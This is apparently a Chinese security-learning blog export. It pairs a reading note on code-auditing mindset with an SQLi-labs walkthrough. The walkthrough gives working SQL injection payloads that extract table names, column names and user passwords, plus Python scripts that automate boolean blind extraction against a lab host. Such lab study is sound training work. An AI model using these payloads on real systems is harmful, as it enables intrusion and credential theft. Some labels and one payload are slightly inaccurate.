<p>因为代码审计，寻找漏洞是一个Odessa的过程。Odessa不仅体现在读代码，也体现在如何利用，因为有些漏洞你找到了，却不知道怎么用，有些甚至是，不能利用。</p>
<p>除了上面的三部曲，还有一个<code>curiousity</code>，其实感觉这一个适用任何一个活动或者行业。</p>
<blockquote>
<p>不仅好奇如何找到漏洞，更好奇漏洞如何诞生，如何运作。</p>
</blockquote>
<hr>
<h3 id="BUG-PATCHING"><a href="#BUG-PATCHING" class="headerlink" title="BUG PATCHING"></a>BUG PATCHING</h3><img src="/rustymoon/2023/11/16/Read-How/bugpatching.png" class title="双刃剑">

<p>安全补丁是一个双刃剑，一端对着漏洞，一端对着自己。<br>它会告诉你一些之前的漏洞信息，你可以推测漏洞成因、类型，推断一些漏洞变体&#x2F;模式——没准又成功搞出一个漏洞。</p>
<hr>
<h3 id="傲慢与偏见"><a href="#傲慢与偏见" class="headerlink" title="傲慢与偏见"></a>傲慢与偏见</h3><p>这里面提到两个有意思的例子</p>
<ul>
<li><table><tr><td bgcolor="yellow">开源和闭源谁更安全</td></tr></table>

</li>
<li><table><tr><td bgcolor="yellow">there are no more bugs in this.</td></tr></table></li>
</ul>
<p>一个普遍的认为是，开源更安全，毕竟那么多人都在eyes on it。但事实是，三个和尚没水喝。Mark在开源中找到很多漏洞，惊于这些地方无人维护。</p>
<p>一个漏洞解决了就是ending了吗？就像上面提到的漏洞变体&#x2F;模式，还有相应的修复会引入一些微妙的问题——就像高中生物里面学的，遗传病，一个又一个微妙的基因通过生殖引入，最后snow crush。</p>
<hr>
<h3 id="“MOTTO”"><a href="#“MOTTO”" class="headerlink" title="“MOTTO”"></a>“MOTTO”</h3><p>Mark认为</p>
<p><em>对一个程序的工作原理了解得越多，就越有可能找到漏洞，并利用它们。</em></p>
<img src="/rustymoon/2023/11/16/Read-How/more.png" class title="MOTTO">

<p>本觉得对于我们还有一条，你首先要加载 漏洞 模块。</p>
<hr>
<br>
<br>
<br>


<h3 id="类似费曼学习法（感觉就是）"><a href="#类似费曼学习法（感觉就是）" class="headerlink" title="类似费曼学习法（感觉就是）"></a>类似费曼学习法（感觉就是）</h3><img src="/rustymoon/2023/11/16/Read-How/feiman.png" class title="费曼模块apply">

<p>就像写例会PPT的时候，总在想如果对方在这里那里提出一个问题怎么办？OMG我好像答不上来。在想用比较“人话”的话来解释一个漏洞的原理和怎么运行怎么被利用的时候，就会发现自己好像也有很多不懂……准确来说，有点像“例会上的被害妄想症”。</p>
<p><font size="1">这个方法对学习很有效，但我从来没用到我大学课程上面……不过最近看到数据结构与算法的课程设计有点挑战性，可以当作一次1 v 1的例会。</font></p>
<hr>
<br>
<br>

<h3 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h3><p><font size="1">每次提到这个词，脑海里都自动播放you got me looking for attention~</font></p>
<blockquote>
<p>攻击面</p>
</blockquote>
<img src="/rustymoon/2023/11/16/Read-How/att1.png" class title="攻击面">

<p>就如图所说，漏洞只是攻击面里面的一个子集，用一句话来说就是——有人发现了一个攻击面，然后全世界的漏洞都吻了上去。</p>
<br>
<br>
 
<blockquote>
<p>复杂性</p>
</blockquote>
<img src="/rustymoon/2023/11/16/Read-How/att2.png" class title="复杂性">

<p>其实没太懂这里的complexity指什么</p>
<p>个人理解：</p>
<ul>
<li><table><tr><td bgcolor="yellow">应用功能的增加带来程序的复杂也带来漏洞或潜在漏洞的增加。Feature—Driven，生命不息，漏洞不止</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">而开发人员对代码库的引用带来“多余功能”——只是想用代码库里某个功能，但把人一整个家族搬来，家族里面人员混杂，复杂性带来了潜在的漏洞。</td></tr></table></li>
</ul>
<hr>
<br>
<br>

<h3 id="“Findings”"><a href="#“Findings”" class="headerlink" title="“Findings”"></a>“Findings”</h3><p>也就是“随时记录”，idea、漏洞、错误什么的，一方面for积少成多，一方面for随时召回。</p>
<br>
<br>


<table><tr><td bgcolor="yellow">随时召回</td></tr></table>：就是字面意思了，有时候有些东西要记下来才行啊，然后一看，哦原来要搞这些，当时是这么想的。

<br>
<br>

<table><tr><td bgcolor="yellow">记录失败很重要</td></tr></table>for me 平时一些install，调试，exec老是出错但都是改完就扔，下次还犯。所以多记录（document）吧……

<hr>
<h3 id="“shared-experience”"><a href="#“shared-experience”" class="headerlink" title="“shared experience”"></a>“shared experience”</h3><br>

<p>这个其实是我自己取的名字<br>是对于bug patching和代码库的。当一个漏洞出现在a中，那么和a类似的b会不会也有这样的漏洞？——算法思想就那么多，这就是shared experience，再加上还是同类型，极大可能会有相同的bugs。如果没有，那么是怎么修补的呢？<br>可能人家b对于存在的bug from a的态度是：<strong>I Don’t Give A FUCK</strong>，那么就可以<em>give it a fuck</em>了（bushi）</p>
<hr>
<br>
<br>

<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>Mark认为Best cooperation makes Best output，同时工具开发和漏洞研究是分成两个世界的——指工具开发的可能没有漏洞研究的那么了解漏洞，反之可能没那么了解工具开发。</p>
<p>以及新手过度依赖工具，阅读和理解代码能力可能会达不到要求。往大了说我们就到了Cyberpunk的道德议题了——高度工具化的人类是否还是人类？</p>
<p>跑远了……</p>
<br>
<br>

<p>不过工具开发确实也很有意思。</p>
<hr>
<br>

<h3 id="“RULES”"><a href="#“RULES”" class="headerlink" title="“RULES”"></a>“RULES”</h3><ul>
<li><table><tr><td bgcolor="yellow">Understanding The Code</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">Document Your Analysis</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">Revist Code Bases</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">Analyze Failures</td></tr></table></li>
</ul>
]]></content>
      <tags>
        <tag>READING</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLi_labs</title>
    <url>/rustymoon/2023/12/07/SQLi-labs/</url>
    <content><![CDATA[<p>真的久远又模糊……说是sqli lab其实是重新整理和学习SQL注入</p>
<span id="more"></span>

<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>结合着源码看</p>
<h2 id="‘"><a href="#‘" class="headerlink" title="‘"></a>‘</h2><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
<ul>
<li>当注入<code>id=1&#39;</code>时，得到<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<p>对照着翻译一下，<br>SELECT * FROM users WHERE id &#x3D;’1’’ LIMIT 0,1<br>那个报错信息是’error message’，所以可能会误以为是<code>&#39;&#39;1&#39;&#39;</code>。</p>
<p>而当<code>id=1&quot;</code>时，</p>
<p>SELECT * FROM users WHERE id &#x3D; ‘1”‘ LIMIT 0,1</p>
<p>双引号被看作是id的值的一部分，并不会截断原语句，所以就正常输出dumb。</p>
<h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><ul>
<li>当<code>id=1&#39; or &#39;1&#39; = &#39;1</code>的时候</li>
</ul>
<p>SELECT * FROM users WHERE id &#x3D; ‘1’ or ‘1’ &#x3D; ‘1’</p>
<p>因为 or之前的语句 正确，被理解为查询 id &#x3D; 1，而后面的语句也判断为正确，所以整个payload被认为 正确，这会返回所有的用户信息</p>
<p><code>id = 2&#39; or &#39;1&#39; = &#39;1</code>的时候返回的是用户的 id&#x3D;1 的信息，这和上面没有解释的 返回所有用户信息 有关。</p>
<p>拿之前那个数据库的user表来举例：</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/sql1.png" class>
<p>需要注意的是这里的 payload版本是 id &#x3D; 1’ or ‘1’&#x3D;’1</p>
<p><code>LIMIT 0, 1</code>表示只返回查找到的第一个用户信息，这也是为什么两个payload都只出现了 id &#x3D; 1 的用户的信息。</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>再来说注释</p>
<p>举例,想通过注释把后面的LIMIT进行注释掉</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/sql2.png" class>
<p>当然这个是MySQL workbench里面进行的查询，</p>
<p>可以构造一个类似的payload <code>id = 1&#39; or &#39;1&#39; = &#39;1&#39; --+</code>，不过使用之后得到的SQL语句是<br><code>SELECT * FROM user WHERE id=&#39;1&#39; or &#39;1&#39; = &#39;1&#39; -- &#39; LIMIT 0,1</code>并返回 id&#x3D;1的记录</p>
<p>其实在这里注释符号起效了，但是在原代码里面还有另一个限制条件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;font size='5' color= '#99FF00'>"</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name:'</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password:'</span> <span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>mysqli_fetch_array 用于从结果集中获取一行作为关联数组，而在这段代码中只调用了一次，因此只获取了结果集的第一行。</p>
</blockquote>
<p>在这种双重限制之下，即使绕过了 LIMIT 的限制，也还有第二重 限制 。</p>
<hr>


<p>我们换一个代码进行测试</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token comment">// 获取结果集中的行数</span>
       <span class="token variable">$numRows</span> <span class="token operator">=</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numRows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token comment">// 遍历结果集中的每一行</span>
           <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               <span class="token comment">// 遍历当前行的每一列</span>
               <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token keyword">as</span> <span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                   <span class="token keyword">echo</span> <span class="token variable">$column</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span><span class="token punctuation">;</span>
               <span class="token punctuation">&#125;</span>
               <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">echo</span> <span class="token string double-quoted-string">"未找到匹配的记录"</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"查询失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>进行注入攻击则会返回所有记录。</p>
<p><font size="2">追寻短短几行字中的原理的过程得让人用一生去治愈……</font></p>
<hr>
<hr>


<h2 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h2><p>把 <code>or</code>换成<code>and</code><br>就拿最近的这个 <code>id = 1&#39; or &#39;1&#39; = &#39;1&#39; --+</code> 举例</p>
<p><code>id = 1&#39; and &#39;1&#39; = &#39;1&#39; --+</code></p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">sql thing: SELECT * FROM user WHERE id='1' and '1' = '1' -- ' LIMIT 0,1
Your name is: John&lt;br>your psw: daidgiaegigak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我的理解：</p>
<ul>
<li><p><strong>or条件下</strong>，字符’1’等于‘1’为真——<code>making the entire condition true for every row</code>，id&#x3D;1，id&#x3D;2无所谓，执行语句的只是看true or not，true就返回，而这个做到为每一个记录发放 true 通行证，所以返回了所有记录。</p>
</li>
<li><p>而<strong>and条件下</strong>，<code>Since &#39;1&#39;=&#39;1&#39; is always true, the condition simplifies to id = &#39;1&#39;, and it checks whether the id is equal to the string &#39;1&#39;.</code>也是’1’&#x3D;’1’永远为 true ， 这个条件语句就会被简化成 id &#x3D; 1’ （可以理解为为 true 简写），但执行者只看见 id &#x3D; 1‘ 并且在该语句中为 true ，所以就只返回了id &#x3D; 1的记录</p>
</li>
</ul>
<hr>

<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>正常的order by 用法：</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/order3.png" class>

<p>而在SQL注入中用的是：</p>
<p><code>SELECT * FROM user WHERE id=&#39;1&#39; order by 4 -- ；</code></p>
<p>payload就是 <code>id = 1&#39; order by 4 --+</code></p>
<img src="/rustymoon/2023/12/07/SQLi-labs/order1.png" class>

<p>当修改 order by后面的数字为5的时候：</p>
<p>Error Code: 1054. Unknown column ‘5’ in ‘order clause’</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/order2.png" class>

<p>可以由这种对比中看出这个 order by 究竟在 by 个什么——<strong>columns</strong>。</p>
<p>这个测试表里面有 4 个columns：</p>
<ul>
<li>username</li>
<li>email</li>
<li>password</li>
<li>id</li>
</ul>
<p>超出column数的时候就会报错，而没有超过都会正常回显，借此可以知道有几列(column)</p>
<blockquote>
<p>当你指定ORDER BY 4，数据库会尝试按照第4列的值对结果进行排序。如果user表有至少4列，这个查询就会成功执行并返回结果。但是，如果user表少于4列，数据库就无法找到第4列，这个查询就会失败，并返回一个错误，通常是“Unknown column ‘4’ in ‘order clause’”。</p>
</blockquote>
<hr>

<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><code>SELECT * FROM user where id = &#39;-1&#39; union select 1,2,3,4-- &#39;</code></p>
<img src="/rustymoon/2023/12/07/SQLi-labs/union1.png" class>

<blockquote>
<p>SELECT * FROM user where id &#x3D; ‘-1’ union select 1,2,3,4– ‘的含义是，先从user表中选择那些id等于-1的行，然后将结果与select 1,2,3,4的结果合并。<br>UNION操作符用于合并两个或多个SELECT语句的结果集。在这个查询中，union select 1,2,3,4会创建一个临时的结果集，其中包含一行，这一行的值分别是1,2,3,4。</p>
</blockquote>
<p>id &#x3D; -1 这一行其实不存在，如果使用了存在的id进行 union：</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/union2.png" class>

<p>这一个可以理解为寻找回显点。</p>
<p>id&#x3D;1</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/1.png" class>

<p>id&#x3D;2</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/2.png" class>

<p>id&#x3D;-1’ union select 1,2,3–+</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/3.png" class>

<p>三张图片对比，找到回显点是 <code>name</code> 和 <code>password</code>这两个地方</p>
<hr>

<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><code>id = -1&#39; union select 1, database(), version() --+</code></p>
<p>用那个测试表</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/database1.png" class>

<ul>
<li>最上面的那行告诉了回显点在 1 和 3</li>
<li>在SQL语句中找到相应位置进行修改</li>
<li>最后可以看到在 1 和 3 对应的位置，分别修改成了 数据库的名称 demo 和版本 8.0.34</li>
</ul>
<hr>

<h2 id="Group-concat"><a href="#Group-concat" class="headerlink" title="Group_concat"></a>Group_concat</h2><p>到这里的时候换了一个数据库，所以数据库内容有些许不同。</p>
<blockquote>
<p>GROUP_CONCAT时MySQL数据库提供的一个聚合函数</p>
</blockquote>
<p>在数据库测试</p>
<p><code>SELECT * FROM user WHERE id=&#39;-1&#39; UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;demosql&#39; -- ;</code></p>
<img src="/rustymoon/2023/12/07/SQLi-labs/groupconcat1.png" class>

<p>不过在demo界面进行测试的时候出了点意外：</p>
<ul>
<li>查询失败: SELECT command denied to user ‘demo‘@’localhost’ for table ‘tables’</li>
</ul>
<p>悲伤的故事，没有足够权限……提权的事情之后说。</p>
<p>不过我们看sqli lab</p>
<ul>
<li><code>id=-1%27%20union%20select%201,2,%20GROUP_CONCAT(table_name)%20from%20information_schema.tables%20WHERE%20table_schema=%27security%27--+</code></li>
</ul>
<p>也就是</p>
<ul>
<li><code>id=-1&#39; union select 1,2, GROUP_CONCAT(table_name) from information_schema.tables WHERE table_schema=&#39;security&#39;</code></li>
</ul>
<img src="/rustymoon/2023/12/07/SQLi-labs/concat2.png" class>

<hr>

<h3 id="一个位置问题"><a href="#一个位置问题" class="headerlink" title="一个位置问题"></a>一个位置问题</h3><p>这里也有一个有趣的点，</p>
<p>如果你是写成  1，group_concat.., 3 那么就会报错</p>
<ul>
<li>UNION SELECT 选择了 <strong>两个</strong> 表达式：<b>1, GROUP_CONCAT(table_name)</b>。</li>
</ul>
<p>而上面的 1，2，group_concatxxx</p>
<ul>
<li>UNION SELECT 选择了 <strong>三个</strong> 表达式：<b>1, 2, GROUP_CONCAT(table_name)</b>。</li>
</ul>
<p>原因也很简单（找半天）： WHERE 后面指定的 键不能有 <code>,</code>，会引起语法错误。</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/error1.png" class>

<p>这个语句的目的是将 SELECT <code>*</code> FROM user WHERE id&#x3D;’-1’ 的结果与SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’demosql’的结果合并在一起。</p>
<p>因为SELECT <code>*</code> FROM user选择了3个列（该user表中有3个列），所以UNION SELECT也需要选择3个值，以便结果的列数相同。</p>
<hr>

<p>但是也不是不能把 3 写在后面，但是不是 最后面：</p>
<ul>
<li><code>SELECT * FROM user WHERE id=&#39;-1&#39; UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=&#39;demosql&#39; -- ;</code></li>
</ul>
<p>payload version:</p>
<ul>
<li><code>?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=&#39;demosql&#39; --+</code></li>
</ul>
<img src="/rustymoon/2023/12/07/SQLi-labs/concat3.png" class>


<h3 id="多输出？"><a href="#多输出？" class="headerlink" title="多输出？"></a>多输出？</h3><p>前面提到即使注释掉了 LIMIT 0, 1 也还有一个if条件语句进行输出限制，为什么这里多个表名就能一起输出了？（有这个疑问一方面是我和那个if斗争太久，一方面是没怎么去看group_concat的作用。）</p>
<p>原因 is：</p>
<blockquote>
<p>当使用GROUP_CONCAT(table_name)来获取所有的表名时，所有的表名都会被连接成一个长字符串，然后作为一条记录返回。</p>
</blockquote>
<hr>


<h3 id="shoot"><a href="#shoot" class="headerlink" title="shoot"></a>shoot</h3><p>查询表内列名：</p>
<p><code>?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name=&#39;users&#39; --+</code></p>
<p>得到列名之后进一步 查询id, 用户及其密码：</p>
<p><code>?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(id, username, password), 3 FROM users --+</code></p>
<p>所以基本的SQL注入语句就是上述几种。对于 Less-1， Less-2完全够用了。Less-1和Less-2~4的去捏也只是 SQL 执行语句对于 $id 的闭合方式的不同。</p>
<ul>
<li><p>Less-1： $sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;</p>
</li>
<li><p>Less-2： $sql&#x3D;”SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”;</p>
</li>
</ul>
<p>…</p>
<p>在Less-2的这种情况下就不用加 <code>&#39;</code>进行闭合。</p>
<p>不过除了引号闭合，还有其他的符号，在后面的Less就会出现。<br>不想重复该过程所以可以考虑写脚本进行。</p>
<hr>


<p>简单理解，information_schema是一个MySQL创建的信息数据库，保存着MySQL服务维护的所有的其他数据库的信息，但只读，不支持其他操作。<br><a href="https://zhuanlan.zhihu.com/p/88342863">information_schema是什么</a></p>
<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>SQL语句和Less-1一致，但是在回显这里有不同：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>	
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>	
	
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这意味着 查询到结果并不会返回，只会告诉你 You are in ………..。</p>
<p>但是输入 id&#x3D;1’使其报错，它确实返回了错误信息。</p>
<p>报错注入就是这样诞生的。</p>
<p>想要从前端得到信息，就从会返回信息的前端界面接收。（感觉说起来要么是废话要么就是得道禅师会说的）</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>因为是用MySQL数据库作为demo，所以用的函数也是MySQL的，不过道理一个样，其他类型数据库顶多是换个函数的区别。</p>
<p>先来认识几个常用函数</p>
<ul>
<li><p><strong>length()</strong><br>判断查询结果长度</p>
</li>
<li><p><strong>substr()</strong><br>截取每一个字符，并穷举出字符内容</p>
</li>
</ul>
<p><code>id=1 and exists(select * from information_schema.tables)--+</code></p>
<p>查询database名长度</p>
<p><code>id=1&#39; and length((select database()))&gt;9 --+</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url_template <span class="token operator">=</span> <span class="token string">'http://xxx/sqli-labs-master/Less-5/?id=1\' and length((select database()))=&#123;&#125; --+'</span>
length <span class="token operator">=</span> <span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">guess_length</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_template<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'You are in'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text

<span class="token keyword">while</span> guess_length<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    length <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"The length of the database name is: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>再通过substr()和ASCII查询到database名</p>
<p><code>id=1&#39; and ascii(substr((select database()), 1, 1))=115 --+</code></p>
<p>substr(a,b,c)</p>
<ul>
<li>a为截取的字符串</li>
<li>b为截取的位置</li>
<li>c为截取的长度</li>
</ul>
<p>一个简单脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://xxx/sqli-labs-master/Less-5/?id=1\' and ascii(substr((select database()), &#123;0&#125;, 1))=&#123;1&#125; --+'</span>

<span class="token keyword">def</span> <span class="token function">guess_character</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span> ascii_value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span> ascii_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ascii_value<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

position <span class="token operator">=</span> <span class="token number">1</span>
characters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> ascii_value <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        character <span class="token operator">=</span> guess_character<span class="token punctuation">(</span>position<span class="token punctuation">,</span> ascii_value<span class="token punctuation">)</span>
        <span class="token keyword">if</span> character <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            characters<span class="token punctuation">.</span>append<span class="token punctuation">(</span>character<span class="token punctuation">)</span>
            position <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>character<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

database_name <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>characters<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>database_name<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>免去一个字一个字手动操作的不必要的事情，当然，用sqlmap比较方便。</p>
<ul>
<li><code>id = 1&#39; and length((select group_concat(table_name) from information_schema.tables where table_schema = database()))&gt;13 --+</code></li>
<li><code>id = 1&#39; and ascii(substr(group_concat(table_name) from information_schema.tables where table_shcema = database()),1 ,1))&gt;99 --+</code></li>
<li><code>id = 1&#39; and length((select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#39;users&#39;))&gt;13 --+</code></li>
